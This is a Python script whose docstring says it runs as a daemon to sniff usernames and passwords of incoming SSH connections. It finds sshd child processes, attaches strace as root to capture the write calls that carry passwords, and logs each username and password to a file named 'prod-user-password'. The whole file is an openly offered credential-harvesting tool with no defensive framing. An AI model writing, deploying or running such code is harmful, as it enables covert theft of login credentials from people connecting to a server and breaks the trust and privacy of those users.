#!/usr/bin/env python

'''
this script is used to sniff username and password when there is ssh connection comes in 
it will run as daemon
'''
import os
import sys
import subprocess
import ptrace.debugger
import logging

def main():
    verifyuser()
    # get child process pid of parent sshd process
    cmd = "ps aux | grep ssh | grep net | grep -v grep| awk {' print $2'} "
    while True:
        try:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = p.communicate()
            if err:
                logger.error( "get pid error : %s" % err)
                sys.exit(1)
            # remove whitespace , tab , enter around pid
            out = out.strip()
            # handle cases that there are multiple ssh connections comes in at the the same time 
            pids = out.split()
            if len(pids) == 0:
                continue
            else:
                for pid in pids:
                    getuser(pid)
                    getpasswd(pid)
                    logger.info("----------------------------")
                    continue
        except Exception, e:
            logger.error( "Unknown Exception:%s " % e)
            sys.exit(1)

def verifyuser():
    # verify that the program is runned as root , because strace must be runned as root
    if not os.geteuid() == 0:
        print "This program must be runned as root !"
        sys.exit(1)

def getuser(pid):
    cmd = "ps aux | grep %s | grep -v grep | awk '{print $(NF-1)}'" % pid
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    if err:
        logger.error( "get user error: %s" % err)
        sys.exit(1)
    user = out.strip()
    logger.info( "user: %s" % user)

def getpasswd(pid):
    if isinstance(pid, basestring):
        pid = int(pid)
    cmd = "strace -e write -p %s 2>&1" % pid
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    if err:
        logger.error( "get password error: %s" % err)
        sys.exit(1) 
    logger.info( "password: %s" % out)

if __name__ == "__main__":
    log = 'prod-user-password'
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.INFO)
    handler = logging.FileHandler(log)
    handler.setLevel(logging.INFO)
    logger.addHandler(handler)
    main()
